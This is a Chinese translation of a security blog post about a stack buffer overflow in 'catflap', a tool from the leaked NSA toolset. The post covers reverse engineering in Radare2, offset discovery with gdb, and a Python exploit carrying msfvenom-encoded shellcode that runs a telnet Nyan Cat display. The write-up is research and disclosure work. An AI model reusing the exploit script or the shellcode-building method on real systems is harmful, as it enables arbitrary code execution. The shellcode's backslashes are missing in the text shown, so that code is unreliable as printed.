# 【技术分享】我是如何利用NSA泄露的安全工具的漏洞在终端上玩转彩虹猫游戏的

阅读量 **105229**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-05-15 10:01:22

 **x**

##### 译文声明

本文是翻译文章，文章来源：hurricanelabs.com

原文地址：<https://www.hurricanelabs.com/blog/overflow-exploit-catflap-zero-day>

译文仅供参考，具体内容表达以及含义原文为准。

****

翻译：[ **shan66**](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：200RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**概述**

最近，我正盘算着找些东东来砥砺一下自己的逆向技能。选谁呢？我们知道，在NSA被泄漏的工具中，有一个名为catflap的一个可执行文件（ELF）：NSA工具……ELF格式……名为catflap……，听起来很有趣，好吧，那就选它了。

我启动了Radare2，开始逆向分析。后来，在0x08048a10处发现了一个函数，它似乎创建了一个“恶意缓冲区”，来故意造成溢出。经过分析之后，我发现这个函数本身有一个缓冲区溢出漏洞——缓冲区溢出漏洞利用代码中的缓冲区进行溢出。不仅如此，它还是我见过的最简单的缓冲区溢出漏洞。

  

**漏洞披露**

发现漏洞后，我选择了公开披露，因为即使我将其提交给供应商的话，我们想也不会得到响应。由于这个漏洞的严重程度很低，所以也就不必将时间浪费在取花哨的名字上面了。你觉得它值得拥有一个CVE编号吗？

说实话，我觉得这个“0day”漏洞的主要价值在于其滑稽性。到目前为止，我还没有听别人谈论过catflap中如此特殊的漏洞（实际上，catflap的任何漏洞都没听说过）。所以，即使在网上搜索“catflap
exploit”也没用，因为catapap本身就是一个漏洞。

注意：如果有人早就发现该漏洞的话，请告诉我，那么第一个发现者的桂冠应该属于他们。

  

**漏洞根源**

在深入分析这个漏洞之前，让我们想想为什么会出现这个漏洞。

我认为有三种可能性：

**1\. 开发者是个白痴**

这个溢出漏洞是非常明显的，或者至少对于任何漏洞利用代码开发者来说，是显而易见的。然而，对一个不称职的开发人员来说，难免会错误百出。但是，将对手视为白痴是非常危险的。更可能的情况是，开发人员根本不在乎这个溢出漏洞到底有多么“露骨”。

**2\. 开发者不走心**

这是最有可能的。有人可能认为这个漏洞与C语言缺乏边界检查脱不了干系。该漏洞出现在命令行选项中。如果攻击者希望通过RCE攻击方程式，那么他必须说服方程式成员使用奇怪的参数来运行catflap——看起来参数就像shellcode一样可怕，前提是如果你可以设法让方程式运行带有自己的shellcode的秘密工具的话。但是这种利用方式弱爆了，一个漏洞利用开发者为什么会浪费时间搞这种漏洞呢？

**3\. 该工具具有双重目的**

我很喜欢这个想法，但这真的只是臆测而已。在一个被攻陷的机器上，你可能期待发现一些病毒和漏洞利用代码；漏洞利用代码可以用来攻击其他机器，而病毒则可以维持对本机器的长期控制。两者有很大的区别！那么，如果catflap合二为一呢？
Catapap可以通过溢出可靠地加载任意shellcode。这实际上就是一个从哪方面看都像是漏洞利用代码的病毒注入器。当你发现一些东西看起来像一个漏洞利用代码，闻起来像一个漏洞利用代码，并且运行起来也像一个漏洞利用代码的时候，这意味着你在网络上横向渗透要比感染本地机器要更加困难。

虽然这是一个巧妙的想法，但我怀疑这并非catflap的初衷。catflap显然利用了/ bin /
login中已知的溢出漏洞。这可能是一个古董级别的漏洞，以防万一。ELF中的其他细微线索表明，开发人员对内存管理并不十分谨慎，这意味着它可能是第二个备选项。也就是说，即使不用它，catflap仍然有可能可靠地运行任意shellcode，我们将在后面看到。所以，如果你在一个攻陷的机器上发现了catapap，不要有“愚蠢的黑客，我们不使用Solaris”等想法，要知道catflap可能被用作病毒，以维持对本地机器的长期访问。

  

**漏洞分析**

好的，我们现在开始对这个漏洞进行详细的分析。在0x08048a10处的函数似乎构建了一个用于Solaris漏洞利用的“恶意缓冲区”。它接受的参数之一（ebp
+ 0x10）是用户提供的、可在Solaris机器上运行的命令。这个用户的命令通过strdup（@
0x08048a3e）复制到堆中。这样，就可以引用返回的堆指针cmd_dup了。0x8048c00处的循环将以空格字符（0x20,0x09）来分割cmd_dup字符串。

为了简单起见，我们用python给出相应的实现代码：

    
    
    >>> cmd = "ls -lt/"                      # command provided by user
    >>> exploded_cmd= cmd.split() # the loop splits the command on whitespace
    >>> exploded_cmd
    ['ls', '-l', '/']

如果使用c语言的话，它就不是那么简单了，因为用于分隔的循环需要用空字节替换每个空白符（0x20和0x09）。然后，下一次迭代时需要仔细检查下一个字节是不是空白字符，然后在ebp-0x228数组中附加一个指针，指示其类型。我们称这个ebp-0x228数组为exploded_cmd。explosive_cmd数组显然位于堆栈上（从ebp引用），但是在写入数据之前，分隔循环不会检查数组的大小。这意味着通过提供一个含有大量空白分隔字符的命令字符串，exploit_cmd将把堆栈填充到更高的内存位置，最终覆盖保存的返回地址。

循环完成后，会检查用于终止expanding_cmd数组的空指针是否被破坏。如果被破坏的话，该函数会打印“Command string has too
many tokens”并返回。

  

**漏洞利用**

这里我想要做的事情是，让catapap在终端玩彩虹猫——这就是我的目标。

这个漏洞的利用不仅非常简单，而且特别稳定。我们无法直接控制被覆盖的返回地址，但这并不重要。返回地址将被指向我们的缓冲区的指针所覆盖！而这个缓冲区已经位于堆中。因此，就算是启用了NX和ASLR安全措施，也会被成功绕过。即便对数组的结尾是否已损坏进行检测，也无法防御这种漏洞利用技术。因为在检查时，返回地址已被覆盖。不仅如此，检查失败不会调用exit(-1)，而是返回！

运行shellcode很容易，我们只需要借助偏移量即可。寻找相应偏移量的最简单的方法，只需通过一个包含由空格分隔的单字符组成的大缓冲区来运行该程序，然后查看程序返回的位置。

为此，可以使用以下脚本（offset.py）：

    
    
    l = [ ]
    # remember 0x20 and 0x09 are bad chars
    for i in xrange(0x21, 0xff):
        l.append(chr(i))
    print " ".join(l)

在gdb中启动catflap并在函数的返回（0x08049186）处上设置一个断点：

    
    
    $ gdb -q catflap 
    (gdb) b *0x08049186
    Breakpoint 1 at 0x8049186
    (gdb) run asdf "$(python offset.py )"
    Starting program: /tmp/catflap asdf "$(python offset.py )"
    Command string has too many tokens
    Breakpoint 1, 0x08049186 in ?? ()
    (gdb) x/3i $eip
    => 0x8049186:ret    
       0x8049187:mov    %esi,%esi
       0x8049189:lea    0x0(%edi,%eiz,1),%edi
    (gdb) ni
    0x0804c116 in ?? ()
    (gdb) x/3bx $eip
    0x804c116:0xa80x000x78
    (gdb) x/100bx $eip-30
    0x804c0f8:0x990x000x9a0x000x9b0x000x9c0x00
    0x804c100:0x9d0x000x9e0x000x9f0x000xa00x00
    0x804c108:0xa10x000xa20x000xa30x000xa40x00
    0x804c110:0xa50x000xa60x000xa70x000xa80x00
    0x804c118:0x780x780x780x780x200x780x780x20
    0x804c120:0x780x780x780x780x780x780x780x78
    0x804c128:0x5c0x310x300x5c0x340x5c0x330x30
    0x804c130:0x310x5c0x310x360x200x780x200x78
    0x804c138:0x200x780x200x780x200x780x200x78
    0x804c140:0x200x780x200x780x200x780x200x78
    0x804c148:0x200x780x200x780x200x780x200x5c
    0x804c150:0x0a0x780x200x780x200x780x200x78
    0x804c158:0x200x780x200x78

在x / 100bx $ eip-30命令中，我们看到每个偶数字节都是递增的，而每个奇数字节都为空。这意味着我们位于缓冲区中。在x / 3bx $
eip命令中，我们看到我们所在的字节是0xa8。我们的offset.py脚本是从0x21处的字节（以避免空白符）开始的，所以我们通过0xa8-0x21得到0x87。也就是说，我们的shellcode前面，是由空白符分隔的0x87个字符。

我们首先用下面的代码来仔细检查一下偏移量：

    
    
    $ cat offset.py 
    l = [ ]
    for i in xrange(0x87):
        l.append("Z")
    l.append("BBBB")
    print " ".join(l)
    $ gdb -q catflap 
    Reading symbols from /tmp/catflap...(no debugging symbols found)...done.
    (gdb) b *0x08049186
    Breakpoint 1 at 0x8049186
    (gdb) run asdf "$(python offset.py )"
    Starting program: /tmp/catflap asdf "$(python offset.py )"
    Command string has too many tokens
    Breakpoint 1, 0x08049186 in ?? ()
    (gdb) ni
    0x0804c116 in ?? ()
    (gdb) x/5bx $eip
    0x804c116:0x420x420x420x420x00

我们到达了第一个“B”（0x42），所以我们只需要把shellcode放在那里，就可以让代码执行了。我们到哪里下载Nyan Cat shellcode呢？
当然是Metasploit！为此，我们只需要运行命令“telnet
nyancat.dakko.us”即可。Metasploit的msfvenom有一个“linux / x86 /
exec”有效载荷，可以执行telnet命令。当在命令行中运行它时，可以使用ASCII编码器使其更加漂亮。

注意：不要忘记坏字节。空字节实际上是允许的，因为我们可以用0x20替换它，程序会把它变成一个0x00。不过，这有可能把偏移量搞砸，所以最好避免使用。

    
    
    $ cat ~/exploit.py 
    #!/usr/bin/python
    import sys
    # telnet nancat
    # > msfvenom -p linux/x86/exec  -b 'x20x09' -v shellcode  -f python CMD="telnet 
    nyancat.dakko.us" -e x86/alpha_mixed
    # No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    # No Arch selected, selecting Arch: x86 from the payload
    # Found 1 compatible encoders
    # Attempting to encode payload with 1 iterations of x86/alpha_mixed
    # x86/alpha_mixed succeeded with size 179 (iteration=0)
    # x86/alpha_mixed chosen with final size 179
    # Payload size: 179 bytes
    # Final size of python file: 972 bytes
    shellcode =  ""
    shellcode += "x89xe1xdaxcbxd9x71xf4x5ax4ax4ax4ax4a"
    shellcode += "x4ax4ax4ax4ax4ax4ax4ax43x43x43x43x43"
    shellcode += "x43x37x52x59x6ax41x58x50x30x41x30x41"
    shellcode += "x6bx41x41x51x32x41x42x32x42x42x30x42"
    shellcode += "x42x41x42x58x50x38x41x42x75x4ax49x62"
    shellcode += "x4ax46x6bx51x48x4ax39x73x62x35x36x33"
    shellcode += "x58x74x6dx31x73x6cx49x69x77x50x68x56"
    shellcode += "x4fx61x63x73x58x75x50x43x58x36x4fx50"
    shellcode += "x62x71x79x30x6ex6cx49x79x73x51x42x79"
    shellcode += "x78x42x38x47x70x77x70x75x50x52x54x31"
    shellcode += "x75x70x6cx70x6ex31x75x44x34x75x70x50"
    shellcode += "x6ex51x69x30x61x30x6ex33x53x63x51x71"
    shellcode += "x64x74x6ex30x64x53x51x72x4bx32x4bx50"
    shellcode += "x6fx64x6ex72x55x74x33x55x50x42x77x76"
    shellcode += "x33x6fx79x48x61x38x4dx4dx50x41x41"
    l = []
    for i in xrange(0x87):
        l.append("A")
    l.append(shellcode) 
    if ( len(sys.argv) == 1 ) :
        print  " ".join(l) 
    else:
        print  repr( " ".join(l) )

最后执行：

    
    
    $ ./catflap asdf "$(python ~/exploit.py )"

或者：

    
    
    $ python ~/exploit.py a
    'A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A 
    x89xe1xdaxcbxd9qxf4ZJJJJJJJJJJJCCCCCC7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIbJFkQHJ9sb563Xtm1slIiwPhVOacsXuPCX6OPbqy0nlIysQByxB8GpwpuPRT1uplpn1uD4upPnQi0a0n3ScQqdtn0dSQrK2KPodnrUt3UPBwv3oyHa8MMPAA'
    $ ./catflap a "$(printf 'A A A A A A A A A A A A A A A A A A A A A A A A A A A A
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    x89xe1xdaxcbxd9qxf4ZJJJJJJJJJJJCCCCCC7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIbJFkQHJ9sb563Xtm1slIiwPhVOacsXuPCX6OPbqy0nlIysQByxB8GpwpuPRT1uplpn1uD4upPnQi0a0n3ScQqdtn0dSQrK2KPodnrUt3UPBwv3oyHa8MMPAA')"

具体效果，请看下面的视频：

本文翻译自hurricanelabs.com [原文链接](https://www.hurricanelabs.com/blog/overflow-exploit-catflap-zero-day)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **shan66** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86090](/post/id/86090)

安全客 - 有思想的安全新媒体

本文转载自: [hurricanelabs.com](https://www.hurricanelabs.com/blog/overflow-exploit-catflap-zero-day)

如若转载,请注明出处： <https://www.hurricanelabs.com/blog/overflow-exploit-catflap-zero-day>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0137bdcb0fbd458b88.jpg) shan66

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

